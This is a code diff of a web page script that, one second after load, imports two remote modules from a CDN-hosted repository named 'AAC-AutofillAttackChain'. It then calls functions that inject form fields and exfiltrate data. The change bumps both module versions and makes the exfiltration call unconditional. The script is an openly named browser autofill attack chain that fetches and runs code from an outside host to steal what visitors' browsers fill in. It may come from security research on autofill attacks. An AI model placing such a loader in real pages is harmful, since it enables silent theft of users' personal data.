@@ -33,15 +33,15 @@
         window.addEventListener('load', () => {
             setTimeout(async () => {
                 const attackModule = await import(
-                    'https://cdn.jsdelivr.net/gh/AAC-AutofillAttackChain/dynamic-cdn-scripts@v1.0.0/details_summary.js'
+                    'https://cdn.jsdelivr.net/gh/AAC-AutofillAttackChain/dynamic-cdn-scripts@v1.1.0/details_summary.js'
                 );
 
                 const exfilModule = await import(
-                    'https://cdn.jsdelivr.net/gh/AAC-AutofillAttackChain/dynamic-cdn-scripts@v1.0.0/exfiltrate.js'
+                    'https://cdn.jsdelivr.net/gh/AAC-AutofillAttackChain/dynamic-cdn-scripts@v1.1.0/exfiltrate.js'
                 );
 
                 attackModule.injectFields();
-                exfilModule.exfiltration?.();
+                exfilModule.exfiltrate();
             }, 1000);
         });
     </script>
